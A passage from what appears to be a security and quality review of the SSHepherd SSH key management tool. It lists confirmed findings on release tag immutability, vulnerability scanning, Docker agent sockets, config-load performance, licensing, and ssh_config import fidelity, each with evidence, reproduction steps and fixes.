~~~~text
gh api 'repos/javadh75/SSHepherd/rulesets/rule-suites?per_page=30' --jq '.[]|select(.after_sha|startswith("7c3046e") or startswith("9722c42"))'; gh api repos/javadh75/SSHepherd/commits/$(git rev-parse 7c3046e)/check-runs --jq '.check_runs[]|select(.name=="ci-ok")'; gh api 'repos/javadh75/SSHepherd/actions/runs?head_sha='$(git rev-parse 7c3046e)
~~~~

**Impact:** The documented invariant does not hold. Any commit in a multi-commit push, and any PR landed with Squash/Rebase (Dependabot PRs, tested against an older base because strict is false), can reach master without ci-ok on its SHA. Master can then carry commits that fail CI, and a release tag can name one. The release workflow re-runs its own gates, which limits the damage, but bisecting and the 'never tag X' list rely on per-commit greenness.

**Fix direction:** Either narrow the documented claim to 'the pushed tip' or close the gaps: preflight every commit of a range (or push one commit at a time), disable squash/rebase merge (or land Dependabot PRs by fast-forwarding the tested head after a preflight run), and consider strict status checks.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
gh api rulesets/26762995/history -> versions 56763736 (2026-11-07T19:39:51) and 57163017 (2026-11-10T20:42:07); history/56763736 .state.rules = [deletion, non_fast_forward, required_linear_history]. rule-suites: 5026144532/5026241576/5026310221 before 5a1cde6 after 7c3046e result fail; 5026852609 before 5a1cde6 after 9722c42 result pass. commits/7c3046e/check-runs: ci-ok success completed 2026-11-10T17:17:23Z, Go checks/Docker amd64+arm64/Integration alpine+debian+rocky all success; actions/runs?head_sha=7c3046e -> 42862667270 workflow_dispatch preflight/w19 success. rule-suites/4970675763 (adee207, PR #2 squash) rule_evaluations only required_linear_history, non_fast_forward, deletion. Repo allow_squash_merge/allow_rebase_merge true; ruleset strict_required_status_checks_policy false. CLAUDE.md:162 'master's ruleset requires `ci-ok` ... on the pushed commit, so a' / :163 'commit reaches master only after a green run on that SHA'.
~~~~

</details>

#### F018 [medium] Release tags are not immutable for the only person who can push them: the tag ruleset's admin bypass is 'always' and immutable releases are off

- **Status:** CONFIRMED
- **Lens(es):** supply-chain (raw ids: L09-3)
- **Location:** GitHub ruleset 'protect release tags' (id 26768538, bypass\_actors RepositoryRole 5 bypass\_mode always); README.md Release recovery step 2 ('the v\* tag ruleset forbids moving or deleting a tag')
- **Verifier votes:** single: reproduced (sev low)
- **Owner decision:** yes: Make v\* tags truly immutable (a separate no-bypass ruleset for update/delete plus immutable releases), or keep the admin bypass and change the README recovery text to say immutability is by discipline?

**Evidence** (verbatim from the finding):

~~~~text
gh api repos/javadh75/SSHepherd/rulesets/26768538 -> "bypass_actors":[{"actor_id":5,"actor_type":"RepositoryRole","bypass_mode":"always"}],"current_user_can_bypass":"always", rules creation/update/deletion/non_fast_forward. gh api repos/javadh75/SSHepherd -> permissions.admin true for javadh75. gh api repos/javadh75/SSHepherd/immutable-releases -> {"enabled":false}. Related doc drift: the release environment gate was added in 7c3046e, but CLAUDE.md/README set the minimum taggable commit at ca50409 (an ancestor), so a tag on ca50409..5a1cde6 publishes without the 'owner approves each release' step.
~~~~

**Repro:**

~~~~text
gh api repos/javadh75/SSHepherd/rulesets/26768538 --jq '{bypass_actors,current_user_can_bypass}'; gh api repos/javadh75/SSHepherd/immutable-releases
~~~~

**Impact:** The owner's own `git push -f origin vX.Y.Z` or tag delete goes through silently (no prompt for an 'always' bypass). A moved tag triggers release.yml again: publish re-points the X.Y.Z / X.Y GHCR tags to a new digest signed with the identical identity (release.yml@refs/tags/vX.Y.Z), so users cannot tell the versions apart. The README promises this cannot happen.

**Fix direction:** Split the tag ruleset: one ruleset for creation with the admin bypass, and one for update/deletion/non\_fast\_forward with no bypass actors. Turn on immutable releases. Raise the documented minimum release commit to 7c3046e (or later) so the approval claim holds.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
gh api repos/javadh75/SSHepherd/rulesets/26768538 -> rules creation,update,deletion,non_fast_forward; "bypass_actors":[{"actor_id":5,"actor_type":"RepositoryRole","bypass_mode":"always"}],"current_user_can_bypass":"always". gh api .../immutable-releases -> {"enabled":false,"enforced_by_owner":false}. collaborators -> javadh75 admin. README.md:3544-3546 'Never re-tag: the `v*` tag ruleset forbids moving or deleting a tag'. Plan D6 (review-remediation.md:77) 'bypass: repo admin'. release.yml:297-298 and 485-486 'environment: release'. The environment has required_reviewers javadh75. git log -S'environment: release' -> 7c3046e only; git show ca50409:.github/workflows/release.yml | grep environment -> empty; rev-list --count ca50409..7c3046e^ = 133. Tag 'Tag the gated digest' step has no existing-tag check. matching-refs tags/v -> 0 tags.
~~~~

</details>

#### F019 [medium] Release govulncheck: the binary scan's false positive comes from stripping (-s -w), not x/crypto, and that scan gates only the GitHub release, not the image built from the same source

- **Status:** CONFIRMED
- **Lens(es):** supply-chain (raw ids: L09-4)
- **Location:** .github/workflows/release.yml:295 (publish needs: \[verify-ref, check, integration, image, gate], no binaries) and :448-453 (govulncheck -mode=binary on the -s -w dist binary); Makefile:60 (LDFLAGS -s -w)
- **Verifier votes:** single: reproduced (sev low)
- **Owner decision:** yes: Replace the stripped binary scan with an unstripped-twin or per-GOOS source-mode scan (precise and strict), and should publish also need binaries so the image and binaries ship together or not at all?

**Evidence** (verbatim from the finding):

~~~~text
Worktree at 9722c42, govulncheck v1.8.0, linux/arm64: stripped build (-trimpath -ldflags='-s -w ...') -> exit 3, 'Vulnerability #1: GO-2026-5932 ... Vulnerable symbols found: #1: armor.golang.org/x/crypto/openpgp/armor/* ...' (whole-package wildcards); unstripped twin (same flags minus -s -w) -> exit 0, 'No vulnerabilities found ... 1 vulnerability in modules you require, but your code doesn't appear to call these'; source mode (GOOS=linux GOARCH=arm64 govulncheck ./...) -> exit 0, same verdict. Dry run 42860941435: every job publish needs (verify-ref, check, 3x integration, image, 2x gate) succeeded while 'Binary (linux/arm64)' failed at this step, so on a tag push publish would have tagged, signed and moved latest, and release-binaries would have been skipped.
~~~~

**Repro:**

~~~~text
cd <worktree>; CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -ldflags='-s -w' -o s ./cmd/sshepherd; ... -ldflags='' -o u ...; govulncheck -mode=binary s (exit 3) vs govulncheck -mode=binary u (exit 0)
~~~~

**Impact:** Stripped binary mode over-reports at package level, so any advisory on an unused package of a required module blocks the binaries. Waiting for x/crypto v0.59.0 clears this advisory, not the class. Meanwhile the image (the same code) does not wait for this scan, so a tag pushed today yields a signed, published image with no GitHub release (README recovery 5). The darwin binaries get no vulnerability scan for their GOOS at all (source mode runs on the linux runner only).

**Fix direction:** Scan an unstripped twin build (same -trimpath/version flags, no -s -w) or run source mode per shipped GOOS/GOARCH, which is precise. Decide whether publish waits for the binaries legs, so a release is all or nothing.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
Worktree 9722c42. stripped: govulncheck -mode=binary s -> exit 3; 'Vulnerability #1: GO-2026-5932 ... Found in: golang.org/x/crypto@v0.58.0 ... Vulnerable symbols found: #1: armor.golang.org/x/crypto/openpgp/armor/* #2: clearsign... #5: openpgp.golang.org/x/crypto/openpgp/*'. unstripped: exit 0; 'No vulnerabilities found.' ... 'your code doesn't appear to call these'. go tool nm u | grep -c openpgp -> 0; go list -deps ./cmd/sshepherd | grep openpgp -> nothing. Makefile:60 'LDFLAGS := -s -w -X main.version=$(VERSION)'; release.yml:453 govulncheck -mode=binary on ./dist/...; release.yml:295 'needs: [verify-ref, check, integration, image, gate]'; README Release recovery 5 'The image published but the GitHub release has no binaries' documents the split.
~~~~

</details>

#### F020 [medium] README's front-door Docker agent example fails as written: uid 65532 cannot connect to a forwarded 0600 agent socket (Linux), and a host socket bind does not work on Docker Desktop

- **Status:** CONFIRMED
- **Lens(es):** container, product (raw ids: L10-2, L12-1)
- **Location:** README.md:139-149 (Docker install section), README.md:3122-3130 (Container usage covers key files only) || \[L12-1] README.md:139-149 (Install > Docker); README.md:3122-3130 (Container usage covers key files only)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
README.md:147: `-v "$SSH_AUTH_SOCK:/ssh-agent" -e SSH_AUTH_SOCK=/ssh-agent \` with no --user, image USER 65532. Linux-host simulation: ssh-agent run as uid 1000 creates `srw------- 1 1000 1000 agent.sock`; README command against it -> `error: agent preflight: SSH agent unreachable at /sock/agent.sock: dial unix /sock/agent.sock: connect: permission denied` exit=3; same command with `--user 1000` reaches the dial phase (exit 1, blackhole host). macOS Docker Desktop: a throwaway ssh-agent socket bound verbatim -> `connect: permission denied` exit=3, also with `--user 501` (Docker Desktop needs /run/host-services/ssh-auth.sock). grep finds no `host-services`/agent guidance anywhere in README; Container usage only discusses key files. || [L12-1] README.md:142-148: `docker run --rm -v "$PWD/sshepherd.yaml:..." -v "$HOME/.ssh/known_hosts:..." -v "$SSH_AUTH_SOCK:/ssh-agent" -e SSH_AUTH_SOCK=/ssh-agent -w /work sshepherd:dev audit --known-hosts /work/known_hosts` (no --user). Probe: ssh-agent run as uid 1000 in a volume (socket `srw------- 1000 1000 sock`, the ssh-agent umask 0177 default), then the README command shape against sshepherd:dev -> `error: agent preflight: SSH agent unreachable at /agentdir/sock: dial unix /agentdir/sock: connect: permission denied` [exit 3]. Same run with `--user 1000` -> `SSH agent at /agentdir/sock has no keys loaded` (the socket is reachable). The --user fix appears only in the later CI recipe for key files (README.md:3114), and Container usage (3124-3130) discusses only key-file ownership, never the agent socket.
~~~~

**Repro:**

~~~~text
On a Linux host with an OpenSSH agent: make docker; run the README 'To run against a fleet from the container' command. It exits 3 at the agent preflight. (Simulation used: ssh-agent -D -a as uid 1000 in sshepherd-it-sshd:alpine on a shared volume, mounted into the image without --user.) || [L12-1] On Linux: start ssh-agent as your user, ssh-add a key, run the README Install docker command verbatim -> exit 3 'connect: permission denied'. (On Docker Desktop for macOS a host $SSH_AUTH_SOCK path cannot be bind-mounted at all; /run/host-services/ssh-auth.sock is needed; not reproduced here.)
~~~~

**Impact:** The first fleet example a new user copies never works; they hit an agent permission error and either give up or run the container as root to get past it. || \[L12-1] The first container run a new user tries, copied from the Install section, fails with exit 3 and a message that does not point at the uid mismatch; the documented 'forward your SSH agent' path does not work as written on Linux.

**Fix direction:** Make the example work as written (pass --user matching the socket owner on Linux, document Docker Desktop's /run/host-services/ssh-auth.sock and its permissions) and say in Container usage what the agent socket needs, like the key-file rules already there. || \[L12-1] Add --user "$(id -u)" (or the Docker Desktop host-services socket) to the Install example, explain the agent socket's ownership rule next to the key-file rule in Container usage, and consider a hint on an EACCES agent dial that names the container uid.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Default uid, Linux-shaped (agent as uid 1000, socket 'srw------- 1000 1000 sock', mounted via volume-subpath at /ssh-agent): 'error: agent preflight: SSH agent unreachable at /ssh-agent: dial unix /ssh-agent: connect: permission denied' exit=3. Same with --user 1000: 'SSH agent at /ssh-agent has no keys loaded' (socket reachable). Docker Desktop macOS, throwaway agent /tmp/vf020.*/s 'srw------- javad wheel': no --user -> permission denied exit=3; --user=501 and --user=0 -> 'no keys loaded' (reachable). Dockerfile:41 'USER 65532'; README.md:147 '-v "$SSH_AUTH_SOCK:/ssh-agent" -e SSH_AUTH_SOCK=/ssh-agent \' with no --user. Image used: local sshepherd:dev (2 days old; Dockerfile unchanged since a8e2257).
~~~~

</details>

#### F021 [medium] One access options: entry makes manifest load and every DesiredFor scale as servers x users x access entries x group size (measured ~6-7x per fleet doubling)

- **Status:** CONFIRMED
- **Lens(es):** performance (raw ids: L11-1)
- **Location:** internal/config/restrict.go:90 (grantSources), :114 (keysOn), :165 (userClashes); internal/config/selector.go:77 (entryApplies: slices.Contains over group members); internal/config/config.go:636 (DesiredFor)
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
grantSources scans every access entry for each (user, server): `for n, a := range c.Access { if c.entryApplies(a, user) && entryCovers(a, s) {` and entryApplies is `slices.Contains(c.members[a.Group], user)`. keysOn takes this path for every granted user as soon as `c.optioned` (any entry has options:), and restrictionConflicts runs it for every reached user x every server at load. Probe manifests (tags env/region/role, 20 groups, 4 entry shapes incl. @tag, '*'+except, names, group entries, 50 access tombstones), sshepherd binary built from 9722c42, no network: `validate --known-hosts /dev/null`: 1000x200 plain 0.07s, every entry optioned 0.62s; 2000x400 plain 0.21s, every entry optioned 4.32s, ONE optioned group entry 1.02s. `revoke u0012 --no-apply --yes`: 1000x200 plain 0.48s / all optioned 1.87s / one optioned 1.57s; 2000x400 plain 1.75s / all optioned 11.67s / one optioned 9.67s. In-process (go test -bench, M4, 10 cores): DesiredFor over all servers 2000x400 plain 44ms, one optioned entry 1.60s, all optioned 1.47s; config.Parse all optioned 1000x200 0.34s -> 2000x400 2.17s (6.4x per doubling; plain 31ms -> 101ms); apply.Affected 2000x400 plain 2.3s, all optioned 7.9s, one optioned 6.6s. pprof of Parse at 2000x400: restrictionConflicts->userClashes->grantSources 85.9% cum, entryApplies 70.3% cum, runtime.memequal 49.8% flat. A revoke calls DesiredFor ~6-8 times per server (auditOne, GrantedFingerprints for former and edited, planOne, Affected x2 render + x2 emptied check). The shipped benchmarks cannot see this: internal/audit/bench_test.go benchFleetConfig builds `servers:` only (no users, groups or access), so DesiredFor is empty in every fan-out cell and nothing benchmarks config load, DesiredFor, ClashedKeys or Affected.
~~~~

**Repro:**

~~~~text
In a worktree, add a test-only generator that writes a manifest of S servers (tags [prod|stage|dev, rN, roleN]) x U users (2 ed25519 keys each, 3 operators, 5 protected), 20 groups, per-user access entries (@role/@r, @dev+except, 3 names, '*'+except) and one group entry per group; add `options: [no-agent-forwarding]` to one group entry. Build cmd/sshepherd and time `sshepherd validate --config m.yaml --known-hosts /dev/null` and `sshepherd revoke u0012 --config copy.yaml --no-apply --yes` at 1000x200 and 2000x400; compare with the same manifest without options:.
~~~~

**Impact:** Every command loads the manifest (validate in a GitOps PR check included), and audit/apply/revoke/rotate recompute DesiredFor several times per server. Once a fleet uses one per-grant restriction, CPU before the first dial grows roughly cubically: ~2 s for a 1000-server/200-user revoke, ~10-12 s at 2000/400, and well beyond at larger fleets, with no benchmark or CI bench cell to flag a regression.

**Fix direction:** Precompute at load (Config is immutable afterwards): group membership as sets, the access entries that apply to each user (direct and via groups), and per-server grant sources or the DesiredFor result itself, so keysOn/restrictionConflicts/Affected reuse them; make ServerNamed a map lookup. Add a manifest-scale benchmark (S x U with tags, groups, options, tombstones) for config.Parse, DesiredFor and apply.Affected to make bench and the CI bench job.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
internal/config/restrict.go:100-104 `for n, a := range c.Access { if c.entryApplies(a, user) && entryCovers(a, s) {`; restrict.go:116 `if !c.optioned { return keys }` then `src := c.grantSources(user, s)`; selector.go:79 `return slices.Contains(c.members[a.Group], user)`; via.go:15 ServerNamed `slices.IndexFunc(c.Servers, ...)`. Probe TestF021Scale (worktree, removed): `1000x200 plain parse=20.8ms desiredAll=4.1ms | one parse=32.5ms desiredAll=68.5ms | all parse=334ms desiredAll=74ms`; `2000x400 plain parse=56.8ms desiredAll=18.6ms | one parse=181ms desiredAll=516ms | all parse=2.63s desiredAll=556ms`; `4000x800 plain parse=154ms desiredAll=46.8ms | one parse=1.13s desiredAll=4.01s | all parse=19.99s desiredAll=4.06s` (access entries 420/820/1620).
~~~~

</details>

#### F022 [medium] No vulnerability reporting channel: no SECURITY.md and GitHub private vulnerability reporting is disabled on a public security tool

- **Status:** CONFIRMED
- **Lens(es):** product (raw ids: L12-2)
- **Location:** repo root (no SECURITY.md); GitHub setting private-vulnerability-reporting
- **Verifier votes:** single: reproduced (sev low)
- **Owner decision:** yes: which private channel to publish (GitHub private vulnerability reporting, a security email, or both) and what versions are supported before 1.0?

**Evidence** (verbatim from the finding):

~~~~text
`git ls-files | grep -iE 'security|contrib|conduct|changelog|notice|template'` lists only testdata goldens. `gh api repos/javadh75/SSHepherd/private-vulnerability-reporting` -> `{"enabled":false}`. README has no 'vulnerab' or reporting text (`grep -n -i vulnerab README.md` -> nothing).
~~~~

**Repro:**

~~~~text
Open the repo's Security tab: no policy, no 'Report a vulnerability' button; the only channel is a public issue.
~~~~

**Impact:** A researcher who finds a lockout, revoked-key-resurrection or host-key bypass in a tool that writes authorized\_keys fleet-wide can only disclose it publicly; scanners (OpenSSF Scorecard 'Security-Policy') also flag this before the first release.

**Fix direction:** Add SECURITY.md (supported versions, private channel, response expectations) and enable GitHub private vulnerability reporting, or name another private contact.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
git ls-files | grep -iE 'security|contrib|conduct|notice|\.github/' -> only .github/dependabot.yml, workflows, and *_security* goldens. git log --all -- SECURITY.md .github/SECURITY.md docs/SECURITY.md -> empty. grep -niE 'vulnerab|security@|disclos' README.md -> no disclosure text. gh api repos/javadh75/SSHepherd/private-vulnerability-reporting -> {"enabled":false}. gh api repos/javadh75/SSHepherd -> {"private":false,"visibility":"public"}. GraphQL isSecurityPolicyEnabled -> false, securityPolicyUrl null. gh api repos/javadh75/.github/contents -> 404 (no inherited policy). community/profile: code_of_conduct, contributing null.
~~~~

</details>

#### F023 [medium] Release binaries and the container image ship no LICENSE or third-party notices (BSD-3-Clause, MIT and yaml.v3's Apache NOTICE)

- **Status:** CONFIRMED
- **Lens(es):** product (raw ids: L12-3)
- **Location:** Dockerfile:39 (`COPY --from=build /out/sshepherd /usr/local/bin/sshepherd` only); .github/workflows/release.yml:529-530; Makefile:160-162
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
`go-licenses report ./cmd/sshepherd`: spf13/pflag BSD-3-Clause, golang.org/x/crypto BSD-3-Clause, x/sys/unix BSD-3-Clause, x/term BSD-3-Clause, gopkg.in/yaml.v3 MIT, cobra Apache-2.0 (plus the Go standard library, BSD-3-Clause). gopkg.in/yaml.v3@v3.0.1 also carries a NOTICE file (Copyright 2011-2016 Canonical Ltd., Apache-2.0). release.yml:529-530 uploads only `sshepherd_* SHA256SUMS SHA256SUMS.sigstore.json` (bare binaries, no archive, no LICENSE). `docker export` of sshepherd:dev lists `usr/local/bin/sshepherd` and Debian base-package copyrights under usr/share/doc, but no sshepherd LICENSE or Go dependency notice. `make licenses` only runs `go-licenses check` (compatibility), never `save`/a notices file.
~~~~

**Repro:**

~~~~text
docker create sshepherd:dev; docker export <id> | tar -t | grep -iE 'sshepherd|licen|notice' -> only usr/local/bin/sshepherd and Debian common-licenses.
~~~~

**Impact:** BSD-3-Clause clause 2 and MIT require the copyright notice and license text to accompany binary redistributions, and Apache-2.0 section 4 requires the project's own LICENSE and any NOTICE to travel with it; the first tagged release would ship non-compliant artifacts, which matters for the corporate adoption the license choice targets.

**Fix direction:** Generate a third-party notices bundle at build time (go-licenses save/report, including the Go stdlib), copy LICENSE plus notices into the image (for example /usr/share/doc/sshepherd/) and attach them (or archives containing them) to the GitHub release; keep the check in make check.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Dockerfile:39 `COPY --from=build /out/sshepherd /usr/local/bin/sshepherd` (only COPY in runtime stage). Makefile:67-70 dist builds -o dist/$(BINARY)_$(VERSION)_$(GOOS)_$(GOARCH) only. Makefile:161-162 `go-licenses check --disallowed_types=...` only. release.yml: `gh release create ... --generate-notes sshepherd_* SHA256SUMS SHA256SUMS.sigstore.json`. go-licenses report ./cmd/sshepherd: pflag BSD-3-Clause, x/crypto BSD-3-Clause, x/sys/unix BSD-3-Clause, x/term BSD-3-Clause, yaml.v3 MIT, cobra Apache-2.0. $GOMODCACHE/gopkg.in/yaml.v3@v3.0.1/NOTICE: 'Copyright 2011-2016 Canonical Ltd. Licensed under the Apache License, Version 2.0'. docker export of sshepherd:dev | tar -t | grep -iE 'sshepherd|licen|notice' -> usr/local/bin/sshepherd and usr/share/common-licenses/* (generic texts) only. grep -rnE 'go:embed|LICENSE|[Ll]icense' cmd internal (non-test) -> no output.
~~~~

</details>

#### G004 [medium] Include expands with Go's filepath.Glob, not glob(3): it reads dotfiles ssh skips and orders multi-level matches differently, so import can bind an alias to another machine and account

- **Status:** CONFIRMED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-1)
- **Location:** internal/sshcfg/sshcfg.go:79 (glob: filepath.Glob), :367 (p.glob(pattern)); internal/sshcfg/sshcfg\_test.go fixtures (no dotfile or multi-level case)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Probe c1: config `Include DIR/conf.d/*.conf` + `Host web / HostName 10.0.0.9`; conf.d/.retired.conf `Host web / User olduser / HostName 10.9.9.9` and `Host oldbox / HostName 10.0.0.66 / User root`; conf.d/team.conf `Host web / User deploy`. `sshepherd import --servers-only` -> servers web host 10.9.9.9 user olduser, and oldbox host 10.0.0.66 user root, exit 0 (only 'duplicate host web' warnings, which name team.conf and config as the duplicates). `ssh -G -F config web` -> user deploy, hostname 10.0.0.9; `ssh -G oldbox` -> hostname oldbox, user javad (ssh never read the dotfile). Probe c5: `Include DIR/inc/*/x.conf` with inc/a/x.conf (User from-a, 10.0.0.1) and inc/a-b/x.conf (User from-a-b, 10.0.0.2): sshcfg web = from-a@10.0.0.1, ssh -G web = from-a-b@10.0.0.2 (glob(3) sorts whole paths, '-' < '/').
~~~~

**Repro:**

~~~~text
mkdir conf.d; put a host in conf.d/.old.conf; `Include ~/.ssh/conf.d/*.conf`; run `sshepherd import --servers-only` and compare with `ssh -G ALIAS`.
~~~~

**Impact:** A disabled or hidden fragment (renamed with a leading dot, AppleDouble .\_x.conf, etc.) wins first-obtained over the live config: the manifest names a different HostName/User for an alias and invents hosts ssh does not define. A later apply writes authorized\_keys to that machine/account (if its key is in known\_hosts) while the real one stays unmanaged, so revocations miss it. Contradicts import's --help ('the HostName/Port/User that ssh would use').

**Fix direction:** Implement glob(3) semantics for Include: skip names with a leading '.' unless the pattern component starts with '.', and sort the full match list lexically (sort.Strings on whole paths). Add both cases to includeContextCases so TestResolutionMatchesSSHG pins them against ssh -G.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe c1 (config: Include DIR/conf.d/*.conf + Host web HostName 10.0.0.9; conf.d/.retired.conf: Host web User olduser HostName 10.9.9.9, Host oldbox HostName 10.0.0.66 User root; conf.d/team.conf: Host web User deploy). `sshepherd import --servers-only c1/config` -> servers web host 10.9.9.9 user olduser; oldbox host 10.0.0.66 user root; exit 0. `ssh -G -F c1/config web` -> user deploy, hostname 10.0.0.9; `ssh -G -F c1/config oldbox` -> user javad, hostname oldbox. Probe c5 (Include DIR/inc/*/x.conf; inc/a/x.conf User from-a 10.0.0.1; inc/a-b/x.conf User from-a-b 10.0.0.2): sshepherd -> web 10.0.0.1 user from-a; ssh -G -> user from-a-b, hostname 10.0.0.2. grep for dotfile/glob(3)/leading dot in README.md, docs/, internal/sshcfg finds no documented deviation.
~~~~

</details>

#### G005 [medium] CanonicalizeHostname yes/always is ignored with no warning, but ssh then re-reads the config against the HostName, so import misses Port/User that ssh uses

- **Status:** CONFIRMED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-2)
- **Location:** internal/sshcfg/sshcfg.go:154-160 (only hostname/user/port/identityfile/proxyjump/proxycommand read; 'Every other keyword ... is ignored'); Match gets a warning at :140-142, CanonicalizeHostname none
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: should sshcfg emulate ssh's second pass against HostName when CanonicalizeHostname is set, or only warn that the host may resolve differently?

**Evidence** (verbatim from the finding):

~~~~text
Probe c3 config: `CanonicalizeHostname yes` / `Host web` HostName 10.20.0.5 User deploy / `Host app` HostName 10.20.0.6 / `Host 10.20.0.*` User admin Port 2222. sshcfg: web host=10.20.0.5 user=deploy port=0; app user="". `ssh -G web` -> port 2222; `ssh -G app` -> user admin, port 2222. `sshepherd import --servers-only` writes web at port 22 and skips app ('no User resolved'), exit 0, no warning about canonicalization. ssh_config(5): 'If this option is enabled, then the configuration files are processed again using the new target name'.
~~~~

**Repro:**

~~~~text
Use the c3 config above; compare `sshepherd import --servers-only CFG` with `ssh -G -F CFG web`.
~~~~

**Impact:** In configs that enable canonicalization (common in corporate setups with Host \*.domain blocks), import silently records the wrong port or user, or drops hosts; apply then dials another sshd on the same address (for example a host sshd on 22 instead of a container's on 2222) or reports unreachable, and the operator gets no hint why. The Match case warns; this one does not.

**Fix direction:** When CanonicalizeHostname is yes/always for a host, either run a second resolution pass matching Host patterns against the resolved HostName (as ssh does; canonical-domain DNS can stay unsupported) or at least warn per affected host, like the Match warning. Add a ssh -G differential fixture.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe config c3: 'CanonicalizeHostname yes' / Host web HostName 10.20.0.5 User deploy / Host app HostName 10.20.0.6 / Host 10.20.0.* User admin Port 2222. c0 is the same without the first line. ssh -G -F c3: 'web: user deploy hostname 10.20.0.5 port 2222 canonicalizehostname true' and 'app: user admin hostname 10.20.0.6 port 2222'. ssh -G -F c0: web port 22, app user javad port 22. ./sshepherd import --servers-only c3 (built from 9722c42): 'warn: host "app": no User resolved, skipped' and servers: '- name: web / host: 10.20.0.5 / user: deploy' (no port, so 22), exit=0, no canonicalization warning. sshcfg.go:154-160: case "hostname", "user", "port", "identityfile", "proxyjump", "proxycommand": ... // Every other keyword has no manifest equivalent and is ignored. grep -i canonicali over internal/ cmd/ README finds no handling.
~~~~

</details>

#### G006 [medium] A fresh import -o FILE --force silently drops key-line restrictions and per-grant options: (from=, expiry-time=, no-port-forwarding), so the next apply loosens access, while F1 warns about less risky settings

- **Status:** CONFIRMED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-3)
- **Location:** cmd/sshepherd/import\_settings.go:28-64 (settingLosses: operator, protected, groups, authorized\_keys\_file, tags, via, jump\_only, preserve only); cmd/sshepherd/import.go:31-44 (freshDrops); README.md:1741-1758
- **Verifier votes:** single: reproduced (sev low)
- **Owner decision:** yes: should the F1 --force warning also cover key-line options and per-grant options: (one more manifest\_settings\_dropped row), or should README just state they are dropped silently?

**Evidence** (verbatim from the finding):

~~~~text
Probe f1: FILE user alice with key `from="10.0.0.0/8",no-port-forwarding ssh-ed25519 K alice@probe`, access alice->web with `options: [no-agent-forwarding]` (validate exit 0). `sshepherd import ssh_config -o FILE --force` (ssh_config: Host web, IdentityFile alice) -> exit 0, stderr only '• parsed ... 1 host' and '• derived 1 user', no warn line; FILE now holds `- ssh-ed25519 AAAA... alice@probe` with no options and an access entry with no options:.
~~~~

**Repro:**

~~~~text
Write a manifest with a restricted key (from=/expiry-time= on the key line, or access options:), then run a fresh `sshepherd import CFG -o FILE --force` whose IdentityFile is that key.
~~~~

**Impact:** Restrictions that limit where a key may log in from, when it expires, or what it may forward vanish without a word; apply then rewrites the line unrestricted on every server (an expiring contractor key becomes permanent). README says the run warns 'when FILE holds manifest-only settings an ssh config cannot reproduce'; key-line options are such settings and are not in the disclosed exclusions (only hand-written access: and except:).

**Fix direction:** Add settingLosses rows for users whose key lines carry options the fresh key for that fingerprint lacks, and for access entries with options: (or for any hand-written access, as the plan's gap 4 suggested), or document the exclusion in README and --help.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
Probe (worktree build at 9722c42): validate --config m.yaml -> 'manifest OK: 1 user, 1 server, 1 grant' exit 0; `sshepherd import ssh_config -o m.yaml --force` -> stderr only '• parsed ssh_config: 1 host' / '• derived 1 user from identity files', exit 0; m.yaml after: `keys: - ssh-ed25519 AAAAC3...kjgY alice@probe`, `access: - user: javad-alice servers: [web]` (no options). README.md ~1755: 'The warning does not cover hand-written `access:` entries or `except:` carve-outs.' F1 plan line 30: 'Hand-written access: entries and except: carve-outs are dropped too ... Neither is in the owner's F1 list'. internal/apply/plan.go:454 `row.Loosens, row.Widens = authkeys.Loosening(actual.Options, e.Key.Options)`; internal/authkeys/options.go:49-50 expiry-time/from effect: restricts; internal/apply/report.go:206 renderRewriteWarning(..., "drops restrictive", rw.Loosens).
~~~~

</details>

#### G007 [medium] freshDrops says nothing when FILE fails to load, so --force over a manifest with one typo drops its revocation memory and settings silently

- **Status:** CONFIRMED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-4)
- **Location:** cmd/sshepherd/import.go:35-42 (`old, err := config.Parse(raw); if err != nil { return nil }`; comment ':a missing or invalid file has nothing to lose')
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
Probe: m2.yaml and m3.yaml are identical (serial: 7, one revoked: fingerprint entry), except m3's server has `tag: [prod]` (typo for tags:). `import ssh_config -o m2.yaml --force --servers-only` -> 'warn: .../m2.yaml holds revocation memory (serial 7, 1 revoked: entry) that this fresh import drops ...'. Same on m3.yaml -> no warning, exit 0; `grep -c fingerprint m3.yaml` -> 0 (validate on m3: 'field tag not found in type config.Server').
~~~~

**Repro:**

~~~~text
Take a manifest with serial:/revoked:, introduce any load error (unknown field, a value a newer release validates more strictly), run a fresh `import -o FILE --force`.
~~~~

**Impact:** An invalid manifest still holds revoked: entries; overwriting it silently loses the record that keeps revoked keys from being granted again. This most likely follows an upgrade that tightens validation, when the operator regenerates from ssh config to 'fix' the file.

**Fix direction:** When Parse fails, fall back to a raw YAML decode (or a line scan for top-level serial:/revoked:) and warn that FILE does not load and its revocation memory/settings cannot be checked and will be dropped. Add a row to the freshDrops tests.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
